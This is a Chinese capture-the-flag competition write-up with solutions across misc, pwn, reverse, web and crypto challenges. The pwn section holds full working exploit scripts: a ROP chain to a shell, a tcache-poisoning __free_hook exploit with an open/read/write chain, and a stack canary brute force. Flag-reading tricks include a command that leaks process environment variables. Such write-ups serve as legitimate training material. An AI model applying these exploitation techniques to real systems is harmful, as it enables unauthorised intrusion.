
# 安全知识

认真观看视频学习后得到选择题答案

# Misc

## 网络安全人才实战能力评价现状调研问卷

填写问卷即可

## 签到卡

```py
print(open('/flag').read())
```

## pyshell

pyshell 中下划线可以输出上次命令的结果，这道题比较麻烦的是长度限制，但是可以执行 eval 函数。

执行下列命令即可得到 flag:

```py
>>'open('
'open('
>>_+'"fl'
'open("fl'
>>_+'ag"'
'open("flag"'
>>_+').r'
'open("flag").r'
>>_+'ead'
'open("flag").read'
>>_+'()'
'open("flag").read()'
>>eval(_)
```

## 被加密的生产流量

过滤 modbus，看到可疑数据。

收集起来，CyberChef 一把梭，Base32 解密得到 flag。

---

# PWN

## 烧烤摊儿

gaiming 函数存在栈溢出，程序也没有 PIE，因此思路明确为 ROP。

同时发现前两个函数都有整型溢出，输入负数可以使余额变大，因此可以进到 gaiming 函数中。

完整 exp 如下:

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'> ')
    sl(i2b(choice))
def pijiu(count):
    cmd(1)
    ru(b'3.')
    ru(b"\n")
    sl(i2b(1))
    ru(b'\n')
    sl(i2b(count))

syscall = 0x0000000000402404
pop_rdi_ret = 0x000000000040264f
name = 0x4E60F0
pop_rax_ret = 0x0000000000458827

pijiu(-100000)
cmd(4)
cmd(5)
ru(b'\n')
payload = b"/bin/sh\x00"
payload = payload.ljust(32+8, b"a")
payload += p64(pop_rdi_ret)
payload += p64(name)
payload += p64(0x000000000040a67e)
payload += p64(0)
payload += p64(0x00000000004a404b)
payload += p64(0)*2
payload += p64(pop_rax_ret)
payload += p64(59)
payload += p64(syscall)
sl(payload)

ia()
```

## StrangeTalkBot

先看最后的 run 函数可以猜出其参数，并且存在 UAF，结合 2.31 的 glibc 版本可以确定思路为 `tcache_poisoning` 把堆块改到 `__freehook` 上，但是题目还有沙箱，需要用 magic_gadget 来进行栈迁移加 orw。

来到前面研究输入格式，根据 head 里面的魔数 `0x28AAEEF9` 搜到 `protobuf-c` 库，自己编译后猜出题目的 proto 如下：

```c
syntax = "proto2";
message Devicemsg {
  required sint64 actionid=1; 
  required sint64 msgidx=2; 
  required sint64 msgsize=3; 
  required string msgcontent=4; 
```

并用 c 语言编写 pack：

```c
//serialize_main.c
#include <stdio.h>
#include <stdlib.h>
#include "devicemsg.pb-c.h"

int main (int argc, const char * argv[]) 
{
  Devicemsg msg = DEVICEMSG__INIT; // AMessage
  void *buf;                     // Buffer to store serialized data
  unsigned len;                  // Length of serialized da
    FILE* fd = fopen("./tmpdata", "rb");
    char databuf[0x500];
    fgets(databuf, 0x500, fd);

  msg.actionid  = atoi(argv[1]);
  msg.msgidx    = atoi(argv[2]);
  msg.msgsize   = atoi(argv[3]);
  msg.msgcontent= databuf;
  len = devicemsg__get_packed_size(&msg);

  buf = malloc(len);
  devicemsg__pack(&msg,buf);

  fprintf(stderr,"Writing %d serialized bytes\n",len); // See the length of message
  fwrite(buf,len,1,stdout); // Write to stdout to allow direct command line piping

  free(buf); // Free the allocated serialized buffer
  return 0;
}
```

运行 `protoc-c --c_out=. devicemsg.proto; gcc -o pack ./pack.c ./devicemsg.pb-c.c -lprotobuf-c;` 进行编译。

最终整合上述思路得到如下 exp:

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.31.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

import subprocess

def pack(choice, idx, size, data):
    with open("./tmpdata", "wb") as fd:
        fd.write(data)
    payload = subprocess.Popen(['./pack', str(choice), str(idx), str(size)],
              stdin=PIPE,
              stdout=PIPE,
              stderr=PIPE
              ).stdout.read()
    ru(b'You can try to have friendly communication with me now: \n')
    s(payload)

'''
08 choice*2
10 idx*2
18 size*2
01 22 len str
'''
def new_pack(choice, idx, size, length, data):
    payload = p8(0x08) + p8((choice*2))
    payload += p8(0x10) + p8((idx*2))
    if ((size*2) & 0xffffffffff00):
        payload += p8(0x18) + p8((size*2)&0xff) + p8(0x03)
    else:
        payload += p8(0x18) + p8(i2b(size*2)) + p8(0x01)
    payload += p8(0x22)
    if length < 0x80:
        payload += p8(length)
    else:
        payload += p8(length) + p8(0x1)
    payload += data
    ru(b'You can try to have friendly communication with me now: \n')
    s(payload)

#  pack(1, 1, 0xf0, b"a"*0xa0)
#  ia()

pack(1, 0, 0xf0, b"a")
pack(1, 1, 0xf0, b"a")
pack(1, 2, 0xf0, b"a")
pack(1, 3, 0xf0, b"a")
pack(1, 4, 0xf0, b"a")
pack(1, 5, 0xf0, b"a")
pack(1, 6, 0xf0, b"a")
pack(1, 7, 0xf0, b"a")
pack(1, 8, 0xf0, b"./flag")
for i in range(7):
    pack(4, i, 0, b"a")
pack(4, 7, 0, b"a")
pack(3, 7, 0, b"a")
rn(0x38)
heap_base = u64_ex(rn(8)) - 0xd70
lg("heap_base")
rn(0x50-0x38)
libc_base = u64_ex(rn(8)) - 0x1ecbe0
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
magic_gadget = libc_base + 0x0000000000151990
pop_rdi_ret  = libc_base + 0x0000000000023b6a
pop_rsi_ret  = libc_base + 0x000000000002601f
pop_rdx_ret  = libc_base + 0x0000000000142c92
mov_rsp_rdx  = libc_base + 0x000000000005b4d0
pop_4_ret    = libc_base + 0x000000000010feb0
lg("libc_base")
lg("magic_gadget")

payload = p64(libc_base + libc.sym["__free_hook"])
new_pack(2, 6, 0xf0, 8, payload)

payload =  p64(pop_4_ret)
payload += p64(heap_base + 0xbb0)
payload += b"a"*0x10
payload += p64(mov_rsp_rdx)
payload += p64(pop_rdi_ret) + p64(heap_base + 0xe90)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(libc_base+libc.sym.open)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(heap_base + 0xe90)
payload += p64(pop_rdx_ret) + p64(0x100)
payload += p64(libc_base + libc.sym.read)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(libc_base + libc.sym.write)
lg("len(payload)")

new_pack(1, 9, 0xf0, len(payload), payload)
payload = p64(magic_gadget) + p64(heap_base + 0xbb0)
payload += b"a"*0x10
payload += p64(mov_rsp_rdx)
new_pack(1, 10, 0xf0, len(payload), payload)

pack(4, 9, 0, b"a")

ia()
```

## funcanary

主函数有栈溢出，folk 后 canary 和 elf 地址都不变，因此可以逐字节爆破 canary 后爆破打到后门函数，exp 如下：

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'> ')
    sl(i2b(choice))

context(arch='amd64')

canary=[b'\x00']
for i in range(7):
    for b in range(256):
        ru(b'come')
        s(flat(b'\x00'*(0x70-8),canary,p8(b)))
        if b'terminated' not in ru(b'wel'):
            canary.append(p8(b))
            break
for a in range(2,0xf2+1,0x10):
    if b'flag' in ru(b'come'):
        break
    s(flat(b'\x00'*(0x70-8),canary,0,b'\x2e',p8(a)))

ia()
```

---

# Reverse

## babyRE

读附件可知此题简单，每一位异或前一位即可：
```py
secret = [102, 10, 13, 6, 28, 74, 3, 1, 3, 7, 85, 0, 4, 75, 20, 92, 92, 8, 28, 25, 81, 83, 7, 28, 76, 88, 9, 0, 29, 73, 0, 86, 4, 87, 87, 82, 84, 85, 4, 85, 87, 30]

for i in range(1, len(secret)):
    secret[i] ^= secret[i - 1]
    print(chr(secret[i]), end='')
```

---

# Web

## unzip

和 21 年深育杯 ZIPZIP 完全一样，直接抄作业就行

https://www.secpulse.com/archives/169667.html

## dumpit

---

# Crypto

## 基于国密SM2算法的密钥密文分发

按照题目描述，调用库进行加密解密即可
```py
<code>
```

## 可信度量

``cat /proc/*/task/*/envrion``

非预期，ssh 进去运行可以得到 flag

## Sign_in_passwd

base64 换表，urldecode 表，放进 cyberchef 里面

## badkey1

如果 $\gcd(n,d)\not=1$ 则会报错

考虑构造 $p,q$。对于一个 512-bit prime p 有 
$$
\begin{aligned}
&ed\equiv 1\pmod {(p-1)(q-1)}\\
&ed= 1+k(p-1)(q-1)\\
&emp= 1+k(p-1)(q-1)\\
\end{aligned}
$$

因为 $ed<e(p-1)(q-1)$，故 $1\le k<e$  

$$
\begin{cases}
&ed\equiv 1\\
&emp\equiv 1\\
&em(p-1+1)\equiv 1\\
&em\equiv 1\\
\end{cases}\pmod {p-1}
$$

即 $m=e^{-1}\bmod(p-1)$

所以可以枚举 $k$。对于每个 $k$，另有 $e,m,p$ 已知，故可以算出 $q$，检验 $q$ 是否为质数即可。


```py
<code>
```

